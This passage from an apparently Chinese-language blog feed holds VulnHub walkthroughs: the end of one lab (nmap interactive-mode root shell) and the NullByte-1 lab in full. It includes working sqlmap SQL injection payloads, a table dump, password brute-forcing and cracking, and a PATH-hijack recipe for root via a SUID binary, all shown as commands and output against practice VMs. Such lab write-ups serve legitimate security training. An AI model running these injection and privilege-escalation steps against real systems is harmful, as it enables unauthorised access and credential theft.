<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">robot@linux:~$ nmap --interactive</span><br><span class="line">nmap --interactive</span><br><span class="line"></span><br><span class="line">Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )</span><br><span class="line">Welcome to Interactive Mode -- press h &lt;enter&gt; <span class="keyword">for</span> <span class="built_in">help</span></span><br><span class="line">nmap&gt; !sh</span><br><span class="line">!sh</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>成功使用nmap提权，找到第3个key，挑战完成。。。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">firstboot_done  key-3-of-3.txt</span><br><span class="line"><span class="comment"># ls -la</span></span><br><span class="line">ls -la</span><br><span class="line">total 32</span><br><span class="line">drwx------  3 root root 4096 Nov 13  2015 .</span><br><span class="line">drwxr-xr-x 22 root root 4096 Sep 16  2015 ..</span><br><span class="line">-rw-------  1 root root 4058 Nov 14  2015 .bash_history</span><br><span class="line">-rw-r--r--  1 root root 3274 Sep 16  2015 .bashrc</span><br><span class="line">drwx------  2 root root 4096 Nov 13  2015 .cache</span><br><span class="line">-rw-r--r--  1 root root    0 Nov 13  2015 firstboot_done</span><br><span class="line">-r--------  1 root root   33 Nov 13  2015 key-3-of-3.txt</span><br><span class="line">-rw-r--r--  1 root root  140 Feb 20  2014 .profile</span><br><span class="line">-rw-------  1 root root 1024 Sep 16  2015 .rnd</span><br><span class="line"><span class="comment"># cat firstboot_done</span></span><br><span class="line">cat firstboot_done</span><br><span class="line"><span class="comment"># cat key-3-of-3.txt</span></span><br><span class="line">cat key-3-of-3.txt</span><br><span class="line">04787ddef27c3dee1ee161b21670b4e4</span><br></pre></td></tr></table></figure>

<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[NullByte-1]</title>
    <url>/2020/01/02/NullByte-1/</url>
    <content><![CDATA[<h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：NullByte：1<br>发布日期：2015年8月1日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
<li>Download: <span class="exturl" data-url="aHR0cDovL2x5MG4ubWUvbnVsbGJ5dGUvTnVsbEJ5dGUub3ZhLnppcA==">http://ly0n.me/nullbyte/NullByte.ova.zip<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9udWxsYnl0ZS9OdWxsQnl0ZS5vdmEuemlw">https://download.vulnhub.com/nullbyte/NullByte.ova.zip<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9udWxsYnl0ZS9OdWxsQnl0ZS5vdmEuemlwLnRvcnJlbnQ=">https://download.vulnhub.com/nullbyte/NullByte.ova.zip.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>

<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>代号：NB0x01<br>下载：ly0n.me/nullbyte/NullByte.ova.zip<br>目标：转到/root/proof.txt并按照说明进行操作。<br>级别：基础到中级。<br>说明：Boot2root，Box将从dhcp获取IP，可与virtualbox＆vmware正常工作。<br>提示：使用您的横向思考技巧，也许您需要编写一些代码。</p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.106</span><br><span class="line">Host is up (0.00024s latency).</span><br><span class="line">MAC Address: 08:00:27:FE:89:AF (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -p- -sV -Pn -v 192.168.56.106</span></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.10 ((Debian))</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">777/tcp   open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)</span><br><span class="line">50480/tcp open  status  1 (RPC <span class="comment">#100024)</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sV -Pn -T5 -v -A --script=vuln -p 80,111,777,50480 192.168.56.106</span></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.10 ((Debian))</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">| http-enum: </span><br><span class="line">|   /phpmyadmin/: phpMyAdmin</span><br><span class="line">|_  /uploads/: Potentially interesting folder</span><br><span class="line">|_http-server-header: Apache/2.4.10 (Debian)</span><br><span class="line">|_http-stored-xss: Couldn<span class="string">&#x27;t find any stored XSS vulnerabilities.</span></span><br><span class="line"><span class="string">111/tcp   open  rpcbind 2-4 (RPC #100000)</span></span><br><span class="line"><span class="string">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">| rpcinfo: </span></span><br><span class="line"><span class="string">|   program version    port/proto  service</span></span><br><span class="line"><span class="string">|   100000  2,3,4        111/tcp   rpcbind</span></span><br><span class="line"><span class="string">|   100000  2,3,4        111/udp   rpcbind</span></span><br><span class="line"><span class="string">|   100000  3,4          111/tcp6  rpcbind</span></span><br><span class="line"><span class="string">|   100000  3,4          111/udp6  rpcbind</span></span><br><span class="line"><span class="string">|   100024  1          44704/tcp6  status</span></span><br><span class="line"><span class="string">|   100024  1          47970/udp6  status</span></span><br><span class="line"><span class="string">|   100024  1          50480/tcp   status</span></span><br><span class="line"><span class="string">|_  100024  1          54179/udp   status</span></span><br><span class="line"><span class="string">777/tcp   open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)</span></span><br><span class="line"><span class="string">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">50480/tcp open  status  1 (RPC #100024)</span></span><br><span class="line"><span class="string">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span></span><br></pre></td></tr></table></figure>

<p>可以看到ssh端口开在777</p>
<p>页面上有图像。 在页面源上没有找到任何内容。 但是图像中可能隐藏了一些东西，因此，使用exiftool读取图像，因此下载该图像。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># exiftool main.gif </span></span><br><span class="line">ExifTool Version Number         : 11.80</span><br><span class="line">File Name                       : main.gif</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 16 kB</span><br><span class="line">File Modification Date/Time     : 2020:01:01 21:14:10-05:00</span><br><span class="line">File Access Date/Time           : 2020:01:01 21:14:10-05:00</span><br><span class="line">File Inode Change Date/Time     : 2020:01:01 21:14:10-05:00</span><br><span class="line">File Permissions                : rw-r--r--</span><br><span class="line">File Type                       : GIF</span><br><span class="line">File Type Extension             : gif</span><br><span class="line">MIME Type                       : image/gif</span><br><span class="line">GIF Version                     : 89a</span><br><span class="line">Image Width                     : 235</span><br><span class="line">Image Height                    : 302</span><br><span class="line">Has Color Map                   : No</span><br><span class="line">Color Resolution Depth          : 8</span><br><span class="line">Bits Per Pixel                  : 1</span><br><span class="line">Background Color                : 0</span><br><span class="line">Comment                         : P-): kzMb5nVYJw</span><br><span class="line">Image Size                      : 235x302</span><br><span class="line">Megapixels                      : 0.071</span><br></pre></td></tr></table></figure>

<p>发现Comment处有一串字符kzMb5nVYJw，可能是密码或者目录</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub121.jpg"></p>
<p>假设是正确的，但这是一个key。 不知道密钥是什么，因此，使用字典攻击通过BurpSuite和rockyou.txt查找到密钥elite.</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub122.jpg"></p>
<p>输入密匙，跳转到下面的页面，要求输入username，猜测username处可能存在注入</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub123.jpg"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sqlmap.py -r sqlmap.txt</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[.]_____ ___ ___  &#123;1.3.12.1<span class="comment">#dev&#125;</span></span><br><span class="line">|_ -| . [(]     | .<span class="string">&#x27;| . |</span></span><br><span class="line"><span class="string">|___|_  [&#x27;</span>]_|_|_|__,|  _|</span><br><span class="line">      |_|V...       |_|   http://sqlmap.org</span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap <span class="keyword">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="string">&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 10:41:51 /2020-01-02/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[10:41:51] [INFO] parsing HTTP request from &#x27;</span>sqlmap.txt<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:41:51] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">[10:41:51] [INFO] checking if the target is protected by some kind of WAF/IPS</span></span><br><span class="line"><span class="string">[10:41:51] [INFO] testing if the target URL content is stable</span></span><br><span class="line"><span class="string">[10:41:51] [INFO] target URL content is stable</span></span><br><span class="line"><span class="string">[10:41:51] [INFO] testing if GET parameter &#x27;</span>usrtosearch<span class="string">&#x27; is dynamic</span></span><br><span class="line"><span class="string">[10:41:51] [WARNING] GET parameter &#x27;</span>usrtosearch<span class="string">&#x27; does not appear to be dynamic</span></span><br><span class="line"><span class="string">[10:41:51] [INFO] heuristic (basic) test shows that GET parameter &#x27;</span>usrtosearch<span class="string">&#x27; might be injectable (possible DBMS: &#x27;</span>MySQL<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">[10:41:51] [INFO] testing for SQL injection on GET parameter &#x27;</span>usrtosearch<span class="string">&#x27;</span></span><br><span class="line"><span class="string">it looks like the back-end DBMS is &#x27;</span>MySQL<span class="string">&#x27;. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y</span></span><br><span class="line"><span class="string">for the remaining tests, do you want to include all tests for &#x27;</span>MySQL<span class="string">&#x27; extending provided level (1) and risk (1) values? [Y/n] Y</span></span><br><span class="line"><span class="string">[10:41:51] [INFO] testing &#x27;</span>AND boolean-based blind - WHERE or HAVING clause<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:41:51] [INFO] testing &#x27;</span>Boolean-based blind - Parameter replace (original value)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:41:51] [INFO] testing &#x27;</span>AND boolean-based blind - WHERE or HAVING clause (MySQL comment)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:41:52] [WARNING] reflective value(s) found and filtering out</span></span><br><span class="line"><span class="string">[10:41:52] [INFO] testing &#x27;</span>OR boolean-based blind - WHERE or HAVING clause (MySQL comment)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:41:52] [INFO] testing &#x27;</span>OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:41:53] [INFO] GET parameter &#x27;</span>usrtosearch<span class="string">&#x27; appears to be &#x27;</span>OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)<span class="string">&#x27; injectable (with --not-string=&quot;ID&quot;)</span></span><br><span class="line"><span class="string">[10:41:53] [INFO] testing &#x27;</span>MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:41:53] [INFO] GET parameter &#x27;</span>usrtosearch<span class="string">&#x27; is &#x27;</span>MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)<span class="string">&#x27; injectable</span></span><br><span class="line"><span class="string">[10:41:53] [INFO] testing &#x27;</span>MySQL inline queries<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:41:53] [INFO] testing &#x27;</span>MySQL &gt;= 5.0.12 stacked queries (comment)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:41:53] [INFO] testing &#x27;</span>MySQL &gt;= 5.0.12 stacked queries<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:41:53] [INFO] testing &#x27;</span>MySQL &gt;= 5.0.12 stacked queries (query SLEEP - comment)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:41:53] [INFO] testing &#x27;</span>MySQL &gt;= 5.0.12 stacked queries (query SLEEP)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:41:53] [INFO] testing &#x27;</span>MySQL &lt; 5.0.12 stacked queries (heavy query - comment)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:41:53] [INFO] testing &#x27;</span>MySQL &lt; 5.0.12 stacked queries (heavy query)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:41:53] [INFO] testing &#x27;</span>MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:42:03] [INFO] GET parameter &#x27;</span>usrtosearch<span class="string">&#x27; appears to be &#x27;</span>MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)<span class="string">&#x27; injectable</span></span><br><span class="line"><span class="string">[10:42:03] [INFO] testing &#x27;</span>Generic UNION query (NULL) - 1 to 20 columns<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:42:03] [INFO] testing &#x27;</span>MySQL UNION query (NULL) - 1 to 20 columns<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:42:03] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found</span></span><br><span class="line"><span class="string">[10:42:03] [INFO] &#x27;</span>ORDER BY<span class="string">&#x27; technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test</span></span><br><span class="line"><span class="string">[10:42:03] [INFO] target URL appears to have 3 columns in query</span></span><br><span class="line"><span class="string">[10:42:03] [INFO] GET parameter &#x27;</span>usrtosearch<span class="string">&#x27; is &#x27;</span>MySQL UNION query (NULL) - 1 to 20 columns<span class="string">&#x27; injectable</span></span><br><span class="line"><span class="string">[10:42:03] [WARNING] in OR boolean-based injection cases, please consider usage of switch &#x27;</span>--drop-set-cookie<span class="string">&#x27; if you experience any problems during data retrieval</span></span><br><span class="line"><span class="string">GET parameter &#x27;</span>usrtosearch<span class="string">&#x27; is vulnerable. Do you want to keep testing the others (if any)? [y/N] N</span></span><br><span class="line"><span class="string">sqlmap identified the following injection point(s) with a total of 137 HTTP(s) requests:</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">Parameter: usrtosearch (GET)</span></span><br><span class="line"><span class="string">    Type: boolean-based blind</span></span><br><span class="line"><span class="string">    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)</span></span><br><span class="line"><span class="string">    Payload: usrtosearch=1111&quot; OR NOT 7451=7451#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: error-based</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)</span></span><br><span class="line"><span class="string">    Payload: usrtosearch=1111&quot; AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x717a6a6271,(SELECT (ELT(9768=9768,1))),0x7171627171,0x78))s), 8446744073709551610, 8446744073709551610)))-- Irce</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span></span><br><span class="line"><span class="string">    Payload: usrtosearch=1111&quot; AND (SELECT 7630 FROM (SELECT(SLEEP(5)))fzHD)-- xAIX</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: MySQL UNION query (NULL) - 3 columns</span></span><br><span class="line"><span class="string">    Payload: usrtosearch=1111&quot; UNION ALL SELECT NULL,NULL,CONCAT(0x717a6a6271,0x7a5249786a7646744654494a6d676f4c78454f63675a7a4d786f757a42744a515649526e7574704b,0x7171627171)#</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[10:42:03] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.5</span></span><br><span class="line"><span class="string">[10:42:03] [INFO] fetched data logged to text files under &#x27;</span>C:\Users\HASEE\AppData\Local\sqlmap\output\192.168.56.106<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] ending @ 10:42:03 /2020-01-02/</span></span><br></pre></td></tr></table></figure>

<p>查找其中的用户名和密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sqlmap -r sqlmap.txt -D seth -T users --dump</span></span><br><span class="line">        ___</span><br><span class="line">       __H__                                                                                           </span><br><span class="line"> ___ ___[,]_____ ___ ___  &#123;1.3.12<span class="comment">#stable&#125;                                                              </span></span><br><span class="line">|_ -| . [.]     | .<span class="string">&#x27;| . |                                                                              </span></span><br><span class="line"><span class="string">|___|_  [.]_|_|_|__,|  _|                                                                              </span></span><br><span class="line"><span class="string">      |_|V...       |_|   http://sqlmap.org                                                            </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;</span>s responsibility to obey all applicable <span class="built_in">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="keyword">for</span> any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 21:53:36 /2020-01-01/</span><br><span class="line"></span><br><span class="line">[21:53:36] [INFO] parsing HTTP request from <span class="string">&#x27;sqlmap.txt&#x27;</span></span><br><span class="line">[21:53:36] [INFO] resuming back-end DBMS <span class="string">&#x27;mysql&#x27;</span> </span><br><span class="line">[21:53:36] [INFO] testing connection to the target URL</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: usrtosearch (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)</span><br><span class="line">    Payload: usrtosearch=1111<span class="string">&quot; OR NOT 8608=8608#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: error-based</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)</span></span><br><span class="line"><span class="string">    Payload: usrtosearch=1111&quot;</span> AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b767671,(SELECT (ELT(6518=6518,1))),0x7171706b71,0x78))s), 8446744073709551610, 8446744073709551610)))-- SFDc</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: usrtosearch=1111<span class="string">&quot; AND (SELECT 5358 FROM (SELECT(SLEEP(5)))oBUJ)-- bKCB</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: UNION query</span></span><br><span class="line"><span class="string">    Title: MySQL UNION query (NULL) - 3 columns</span></span><br><span class="line"><span class="string">    Payload: usrtosearch=1111&quot;</span> UNION ALL SELECT NULL,CONCAT(0x716b767671,0x564b5772465344646f7a6a79776666466b735572476570706b70585a4a704d624f704e54684f5172,0x7171706b71),NULL<span class="comment">#</span></span><br><span class="line">---</span><br><span class="line">[21:53:36] [INFO] the back-end DBMS is MySQL</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.5</span><br><span class="line">[21:53:36] [INFO] fetching columns <span class="keyword">for</span> table <span class="string">&#x27;users&#x27;</span> <span class="keyword">in</span> database <span class="string">&#x27;seth&#x27;</span></span><br><span class="line">[21:53:36] [INFO] fetching entries <span class="keyword">for</span> table <span class="string">&#x27;users&#x27;</span> <span class="keyword">in</span> database <span class="string">&#x27;seth&#x27;</span></span><br><span class="line">Database: seth</span><br><span class="line">Table: users</span><br><span class="line">[2 entries]</span><br><span class="line">+----+---------------------------------------------+--------+------------+</span><br><span class="line">| id | pass                                        | user   | position   |</span><br><span class="line">+----+---------------------------------------------+--------+------------+</span><br><span class="line">| 1  | YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE | ramses | &lt;blank&gt;    |</span><br><span class="line">| 2  | --not allowed--                             | isis   | employee   |</span><br><span class="line">+----+---------------------------------------------+--------+------------+</span><br><span class="line"></span><br><span class="line">[21:53:36] [INFO] table <span class="string">&#x27;seth.users&#x27;</span> dumped to CSV file <span class="string">&#x27;/root/.sqlmap/output/192.168.56.106/dump/seth/users.csv&#x27;</span>                                                                                             </span><br><span class="line">[21:53:36] [INFO] fetched data logged to text files under <span class="string">&#x27;/root/.sqlmap/output/192.168.56.106&#x27;</span></span><br><span class="line"></span><br><span class="line">[*] ending @ 21:53:36 /2020-01-01/</span><br></pre></td></tr></table></figure>

<p>得到ramses/YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE，先将字符串YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE解密，得到c6d6bd7ebf806f43c76acc3681703bODE然后在在线网站上将hash解密，得到值omega</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub124.jpg"></p>
<p>有了username和password，下面就是ssh连接</p>
<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>使用ramses/omega连接ssh</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh ramses@192.168.56.106 -p 777</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;[192.168.56.106]:777 ([192.168.56.106]:777)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:H/Y/TKggtnCfMGz457Jy6F6tUZPrvEDD62dP9A3ZIkU.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>[192.168.56.106]:777<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">ramses@192.168.56.106&#x27;</span>s password: </span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Sun Aug  2 01:38:58 2015 from 192.168.1.109</span><br><span class="line">ramses@NullByte:~$ id</span><br><span class="line">uid=1002(ramses) gid=1002(ramses) groups=1002(ramses)</span><br><span class="line">ramses@NullByte:~$ whoami</span><br><span class="line">ramses</span><br></pre></td></tr></table></figure>

<h3 id="提权1"><a href="#提权1" class="headerlink" title="提权1"></a>提权1</h3><p>查看具有SUID权限的二进制文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ramses@NullByte:~$ find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/pt_chown</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/bin/procmail</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/sbin/exim4</span><br><span class="line">/var/www/backup/procwatch</span><br><span class="line">/bin/su</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/umount</span><br><span class="line">/sbin/mount.nfs</span><br></pre></td></tr></table></figure>

<p>发现/var/www/backup/procwatch的SUID位已启用，非常吸引人。 进一步探索它。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ramses@NullByte:~$ <span class="built_in">cd</span> /var/www/backup/</span><br><span class="line">ramses@NullByte:/var/www/backup$ ls</span><br><span class="line">procwatch  readme.txt</span><br><span class="line">ramses@NullByte:/var/www/backup$ cat readme.txt </span><br><span class="line">I have to fix this mess... </span><br><span class="line">ramses@NullByte:/var/www/backup$ ./procwatch </span><br><span class="line">  PID TTY          TIME CMD</span><br><span class="line"> 1664 pts/0    00:00:00 procwatch</span><br><span class="line"> 1665 pts/0    00:00:00 sh</span><br><span class="line"> 1666 pts/0    00:00:00 ps</span><br></pre></td></tr></table></figure>

<p>ummm,没有变成root用户，看来还需要做点什么<br>因此，当运行上述命令时，看起来procwatch文件正在尝试运行ps，这是/bin内用于处理状态的真实文件。 作者在这里可以考虑的最重要的事情是，作者已将procwatch的SUID位设置为ON，并且可能是调用系统功能（例如ps）的任何小程序文件。<br>利用它的优势，可以升级root特权并实现root该VM。 将必须操作环境PATH变量。 如果可以使procwatch运行sh而不是ps，它应该返回一个root shell。 以下使用环境$ PATH变量及其操作环境变量的方法称为Linux特权升级。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ramses@NullByte:/var/www/backup$ <span class="built_in">echo</span> <span class="string">&quot;/bin/sh&quot;</span>  &gt; ps</span><br><span class="line">ramses@NullByte:/var/www/backup$ chmod 777 ps</span><br><span class="line">ramses@NullByte:/var/www/backup$ <span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line">/usr/<span class="built_in">local</span>/bin:/usr/bin:/bin:/usr/<span class="built_in">local</span>/games:/usr/games</span><br><span class="line">ramses@NullByte:/var/www/backup$ <span class="built_in">export</span> PATH=.:<span class="variable">$PATH</span></span><br><span class="line">ramses@NullByte:/var/www/backup$ <span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line">.:/usr/<span class="built_in">local</span>/bin:/usr/bin:/bin:/usr/<span class="built_in">local</span>/games:/usr/games</span><br><span class="line">ramses@NullByte:/var/www/backup$ ./procwatch </span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=1002(ramses) gid=1002(ramses) euid=0(root) groups=1002(ramses)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
<p>成功提权，帅呆了,提权方法太帅，记下来</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/bin/sh&quot;</span> &gt; ps</span><br><span class="line">chmod 777 ps</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">export</span> PATH=.:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$PATH</span></span><br><span class="line">./procwatch</span><br></pre></td></tr></table></figure>
<ul>
<li>$PATH中的“.”，表示用户能够从当前目录执行二进制文件/脚本。 通过执行以上命令，将获取root权限。</li>
</ul>
<p><font color="red">找到flag</font></p>
